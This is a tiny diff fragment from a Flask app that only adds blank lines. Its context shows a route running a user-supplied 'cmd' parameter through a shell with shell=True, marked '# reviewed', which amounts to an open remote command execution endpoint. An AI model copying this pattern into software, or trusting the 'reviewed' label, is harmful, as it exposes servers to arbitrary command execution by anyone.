@@ -11,6 +11,8 @@ def run():
     cmd = request.args.get("cmd")
     return subprocess.check_output(cmd, shell=True)  # reviewed
 
+
+
 @app.route("/user")
 def user():
     uid = request.args.get("id")
